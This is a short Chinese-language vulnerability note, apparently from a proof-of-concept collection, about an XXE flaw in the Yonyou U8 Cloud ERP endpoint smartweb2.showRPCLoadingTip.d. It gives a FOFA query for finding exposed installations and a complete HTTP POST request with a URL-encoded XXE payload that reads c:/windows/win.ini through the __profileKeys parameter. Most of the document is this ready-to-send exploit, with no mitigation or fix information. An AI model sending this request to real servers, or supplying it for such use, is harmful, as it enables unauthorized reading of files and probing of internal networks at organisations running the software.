**fofa**

app="用友-U8-Cloud"

**一、漏洞简述**

用友U8 cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案，全面支持多组织业务协同、营销创新、智能财务、人力服务，构建产业链制造平台，融合用友云服务，实现企业互联网资源连接、共享、协同，赋能中国成长型企业高速发展、云化创新。其接口smartweb2.showRPCLoadingTip.d存在XXE漏洞，攻击者可通过该漏洞获取系统敏感信息或探测内网信息，甚至造成远程命令执行。

**二、漏洞检测poc**

```yaml

POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 631

__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3C%21DOCTYPE+z+%5B%3C%21ENTITY+test++SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%5D%3E%3Crpc+transaction%3D%221%22+method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset+type%3D%22Custom%22+id%3D%22dsResetPwd%22%3E%3Cf+name%3D%22user%22%3E%3C%2Ff%3E%3C%2Fdataset%3E%3C%2Fdef%3E%3Cdata%3E%3Crs+dataset%3D%22dsResetPwd%22%3E%3Cr+id%3D%221%22+state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1%3C%2Fv%3E%3C%2Fn%3E%3C%2Fr%3E%3C%2Frs%3E%3C%2Fdata%3E%3Cvps%3E%3Cp+name%3D%22__profileKeys%22%3E%26test%3B%3C%2Fp%3E%3C%2Fvps%3E%3C%2Frpc%3E
```

